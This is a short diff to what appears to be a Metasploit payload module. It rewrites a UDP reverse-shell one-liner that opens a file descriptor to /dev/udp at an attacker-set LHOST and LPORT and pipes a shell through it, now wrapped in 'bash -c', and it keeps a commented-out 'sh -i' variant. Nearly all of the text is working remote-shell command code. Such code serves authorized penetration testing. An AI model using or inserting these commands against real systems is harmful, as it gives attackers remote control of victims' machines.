@@ -53,7 +53,7 @@ module MetasploitModule
   #
   def command_string
     fd = rand(200) + 20
-    return "0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};sh <&#{fd} >&#{fd} 2>&#{fd}";
+    return "bash -c '0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};sh <&#{fd} >&#{fd} 2>&#{fd}'";
 
     # no semicolons
     #return "sh -i >& /dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1"
